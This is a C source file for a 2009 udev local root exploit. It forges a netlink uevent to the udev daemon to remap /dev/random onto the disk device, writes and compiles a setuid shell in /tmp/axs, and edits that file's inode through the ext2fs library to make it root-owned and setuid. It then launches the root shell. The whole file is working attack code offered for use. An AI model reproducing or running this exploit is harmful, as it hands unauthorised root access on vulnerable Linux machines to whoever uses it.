/*
 * i_root_u-dev.c
 *
 * 17-04-2009
 *
 * udev < 1.4.1 local root exploit
 * Written by Ruben Ventura (tr3w)
 *  + the.tr3w[at]gmail.com
 *
 * vulnerability found by Sebastian Krahmer
 * :: link c0de with ext2fs lib when compiling ::
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <sys/stat.h>
#include <linux/ext2_fs.h>
#include "ext2fs/ext2fs.h"

#define MAX_PAYLOAD 1024

struct sockaddr_nl source_addr, target_addr;
struct nlmsghdr *nlh = NULL;
struct msghdr msg;
struct iovec iovect0r;
char *prog;


void pur3_0wn4g3();

int p4yl0ad_w0rk3d()
{
	printf("[?] Checking if p4yl0ad worked... ");
	FILE *fpipe;
	int maj=-1, min=-1;
	
	fpipe = popen("ls -l /dev/random | awk '{print $5\" \"$6}'\0", "r");
	if (!fpipe)
	{	perror("Problem with pipe");
		exit(1);
	}

	fscanf(fpipe, "%d, %d", &maj,  &min);

	if (maj<0 || min<0)
	{	printf("Couldn't verify if udev was exploited, check above error\n");
		exit(1);
	}

	if (maj == 1 && min == 8)
		return 0;
	return 1;
}

int r00t3d()
{
	FILE *fpipe;
	char own[5];

	fpipe=popen("ls -l /tmp/axs | awk '{print $3}'\0", "r");
	fgets(own, 5, fpipe);
	if(strcmp(own, "root"))
		return 0;
	return 1;
}

void mk_p4yl0ad(char *dest, int major, int minor)
{
    char *m = dest;
    m += sprintf(m,"add@uritonto") +1;
    m += sprintf(m,"DEVPATH=/dev/random") +1;
    m += sprintf(m,"MAJOR=%d",major) +1;
    m += sprintf(m,"MINOR=%d",minor) +1;
    m += sprintf(m,"ACTION=add") +1;
    m += sprintf(m,"SUBSYSTEM=block") +1;
}

void restore()
{
	char fix[strlen(prog)+4];
	sprintf(fix, "%s -r", prog);
	system(fix);
}

void usage(char *s) {
    fprintf(stderr,"Usage: %s  -p <pid_udev> -m <major> -n <minor> | -r \n",s);
    exit(1);
}

int main(int argc, char **argv) {
    int sockfd;
    int udevpid=-1, major=-1, minor=-1, r=0;
    void *p4yl0ad;
    char opts;

    while ((opts=getopt(argc,argv,"p:m:n:r"))!=EOF) {
        switch(opts)
	{
            case 'p':  
                     udevpid=atoi(optarg);
                     break;
            case 'm':  
                     major=atoi(optarg);
                     break;
            case 'n':  
                     minor=atoi(optarg);
                     break;
	    case 'r':
	    	     major=1;
		     minor=8;
		     r=1;
		     break;
            default:
                     usage(argv[0]);
                     break;
        }
    }

    if(major<0 || minor<0)
        usage(argv[0]);
    if (!r){
    printf("\t--=::[ udev local root exploit ]::=--\n");

    prog = argv[0];
    
    p4yl0ad = malloc(NLMSG_SPACE(MAX_PAYLOAD));
    mk_p4yl0ad(p4yl0ad,major,minor);

    if ((sockfd=socket(PF_NETLINK,SOCK_DGRAM,NETLINK_KOBJECT_UEVENT)) == -1)
    {	perror("[-] in socket");
	exit(1);
    }

    memset(&source_addr, 0, sizeof(source_addr));
    source_addr.nl_family = AF_NETLINK;
    source_addr.nl_pid = getpid();
    source_addr.nl_groups = 0;

   if(bind(sockfd,(struct sockaddr*)&source_addr,sizeof(source_addr)) == -1)
   {	perror("[-] binding to socket");
   	exit(1);
   }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.nl_family = AF_NETLINK;
    target_addr.nl_pid = udevpid; 
    target_addr.nl_groups = 0; 
    
    iovect0r.iov_base = (void *)p4yl0ad;
    iovect0r.iov_len = NLMSG_SPACE(MAX_PAYLOAD);
    
    msg.msg_name = (void *)&target_addr;
    msg.msg_namelen = sizeof(target_addr);
    msg.msg_iov = &iovect0r;
    msg.msg_iovlen = 1;
    if (!r) printf("[+] Sending p4yl0ad\n");
    sendmsg(sockfd, &msg, 0);
    close(sockfd);
    
    if (r)
    {	printf("/dev/random restored\n");
    	return 0;
    }

    if (!p4yl0ad_w0rk3d())
    {	printf("FAILED: check udev version... exiting!\n");
    	return 1;
    }
    printf("OK, continuing...\n");

    pur3_0wn4g3();
    return 0;
}

void pur3_0wn4g3()
{
    errcode_t rc;
    ext2_filsys fs;
    ext2_ino_t inum;
    struct ext2_inode t4rg3t;

    printf("[+] Creating axs d00r\n");
    if (system("echo 'int main(){setreuid(0,0);setregid(0,0);system(\"/bin/sh\");}' > /tmp/axs.c"))
    {	printf("[-] Couldn't write axs d00r!\n");
        restore();
    	exit(1);
    }
    if (system("gcc /tmp/axs.c -o /tmp/axs"))
    {	printf("[-] Couldn't compile axs d00r\n");
        restore();
    	exit(1);
    }
    rc=ext2fs_open("/dev/random",EXT2_FLAG_RW,0,0,unix_io_manager,&fs);
    if (rc)
    {	printf("[-] Error at opening filesystem\n");
        restore();
    	exit(1);
    }
    rc=ext2fs_namei(fs, EXT2_ROOT_INO, EXT2_ROOT_INO, "/tmp/axs", &inum);
    if (rc)
    {	printf("[-] Error trying to resolve axsd00r\n");
    	restore();
    	exit(1);
    }
    printf("[+] Attempting to root 5y5t3m\n");
    rc=ext2fs_read_inode(fs, inum, &t4rg3t);
    t4rg3t.i_mode = 0x89ed;
    t4rg3t.i_uid = 0x0;
    t4rg3t.i_gid = 0x0;
    rc=ext2fs_write_inode(fs, inum,&t4rg3t);
    if (rc)
    {	printf("[-] Failed to root!\n");
    	restore();
    	exit(1);
    }
    ext2fs_close(fs);

    printf("[+] Forcing disk-cache flush... this will take a while\n");
    system("rm /tmp/axs.c && find / >/dev/null 2>/dev/null");
    if (!r00t3d())
    {
    	system("find /usr -type f -exec cat {} \\; > /dev/null &");
	while(1)
	{	printf("...still working...\n");
		sleep(300);
		if(r00t3d())
		{	system("killall find");
			break;
		}
	}
    }
    restore(); 
    printf("[+] Done. g0t r00t!\n");
    system("/tmp/axs");

}
